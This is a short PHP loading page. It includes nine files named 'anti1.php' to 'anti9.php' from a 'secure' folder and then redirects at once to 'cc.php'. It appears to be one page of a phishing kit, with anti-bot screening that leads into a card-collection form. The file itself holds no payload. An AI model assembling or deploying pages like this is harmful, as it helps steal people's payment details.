<?php

    include '../secure/anti1.php';
	include '../secure/anti2.php';
	include '../secure/anti3.php';
	include '../secure/anti4.php';
	include '../secure/anti5.php';
	include '../secure/anti6.php';
	include '../secure/anti7.php';
	include '../secure/anti8.php';
    include '../secure/anti9.php';
	

?>
<!DOCTYPE html>
<html>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0; url=cc.php">
<head>
  <title>Loading...</title>
  <style>
    body {
      background-color: #f5f5f5;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .loader {
      width: 50px;
      height: 50px;
      border: 3px solid #ccc;
      border-top-color: #333;
      border-radius: 50%;
      animation: spin 1s infinite linear;
    }
    @keyframes spin {
      0% {
        transform: rotate(0);
      }
      100% {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="loader"></div>
</body>
</html>